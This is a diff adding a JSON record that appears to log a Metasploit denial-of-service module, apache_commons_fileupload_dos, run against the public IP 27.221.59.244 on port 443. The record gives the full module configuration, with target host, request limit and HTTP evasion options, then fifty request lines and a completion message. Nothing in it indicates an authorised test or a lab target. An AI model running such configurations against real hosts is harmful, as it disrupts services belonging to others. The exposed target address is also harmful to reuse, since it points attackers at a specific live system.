@@ -1,0 +1,93 @@
+{"ip":"27.221.59.244:443","protocol":"http","module":"auxiliary/dos/http/apache_commons_fileupload_dos","result":"VERBOSE => true
+RPORT => 443
+SSL => false
+UserAgent => Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+HttpUsername => 
+HttpPassword => 
+DigestAuthIIS => true
+SSLVersion => Auto
+FingerprintCheck => true
+DOMAIN => WORKSTATION
+HttpTrace => false
+HttpTraceHeadersOnly => false
+HttpTraceColors => red/blu
+HTTP::uri_encode_mode => hex-normal
+HTTP::uri_full_url => false
+HTTP::pad_method_uri_count => 1
+HTTP::pad_uri_version_count => 1
+HTTP::pad_method_uri_type => space
+HTTP::pad_uri_version_type => space
+HTTP::method_random_valid => false
+HTTP::method_random_invalid => false
+HTTP::method_random_case => false
+HTTP::version_random_valid => false
+HTTP::version_random_invalid => false
+HTTP::uri_dir_self_reference => false
+HTTP::uri_dir_fake_relative => false
+HTTP::uri_use_backslashes => false
+HTTP::pad_fake_headers => false
+HTTP::pad_fake_headers_count => 0
+HTTP::pad_get_params => false
+HTTP::pad_get_params_count => 16
+HTTP::pad_post_params => false
+HTTP::pad_post_params_count => 16
+HTTP::uri_fake_end => false
+HTTP::uri_fake_params_start => false
+HTTP::header_folding => false
+TARGETURI => /
+RLIMIT => 50
+RHOSTS => 27.221.59.244
+DisablePayloadHandler => True
+[*] Running module against 27.221.59.244
+[*] Sending request 1 to 27.221.59.244:443
+[*] Sending request 2 to 27.221.59.244:443
+[*] Sending request 3 to 27.221.59.244:443
+[*] Sending request 4 to 27.221.59.244:443
+[*] Sending request 5 to 27.221.59.244:443
+[*] Sending request 6 to 27.221.59.244:443
+[*] Sending request 7 to 27.221.59.244:443
+[*] Sending request 8 to 27.221.59.244:443
+[*] Sending request 9 to 27.221.59.244:443
+[*] Sending request 10 to 27.221.59.244:443
+[*] Sending request 11 to 27.221.59.244:443
+[*] Sending request 12 to 27.221.59.244:443
+[*] Sending request 13 to 27.221.59.244:443
+[*] Sending request 14 to 27.221.59.244:443
+[*] Sending request 15 to 27.221.59.244:443
+[*] Sending request 16 to 27.221.59.244:443
+[*] Sending request 17 to 27.221.59.244:443
+[*] Sending request 18 to 27.221.59.244:443
+[*] Sending request 19 to 27.221.59.244:443
+[*] Sending request 20 to 27.221.59.244:443
+[*] Sending request 21 to 27.221.59.244:443
+[*] Sending request 22 to 27.221.59.244:443
+[*] Sending request 23 to 27.221.59.244:443
+[*] Sending request 24 to 27.221.59.244:443
+[*] Sending request 25 to 27.221.59.244:443
+[*] Sending request 26 to 27.221.59.244:443
+[*] Sending request 27 to 27.221.59.244:443
+[*] Sending request 28 to 27.221.59.244:443
+[*] Sending request 29 to 27.221.59.244:443
+[*] Sending request 30 to 27.221.59.244:443
+[*] Sending request 31 to 27.221.59.244:443
+[*] Sending request 32 to 27.221.59.244:443
+[*] Sending request 33 to 27.221.59.244:443
+[*] Sending request 34 to 27.221.59.244:443
+[*] Sending request 35 to 27.221.59.244:443
+[*] Sending request 36 to 27.221.59.244:443
+[*] Sending request 37 to 27.221.59.244:443
+[*] Sending request 38 to 27.221.59.244:443
+[*] Sending request 39 to 27.221.59.244:443
+[*] Sending request 40 to 27.221.59.244:443
+[*] Sending request 41 to 27.221.59.244:443
+[*] Sending request 42 to 27.221.59.244:443
+[*] Sending request 43 to 27.221.59.244:443
+[*] Sending request 44 to 27.221.59.244:443
+[*] Sending request 45 to 27.221.59.244:443
+[*] Sending request 46 to 27.221.59.244:443
+[*] Sending request 47 to 27.221.59.244:443
+[*] Sending request 48 to 27.221.59.244:443
+[*] Sending request 49 to 27.221.59.244:443
+[*] Sending request 50 to 27.221.59.244:443
+[*] Auxiliary module execution completed
+"}
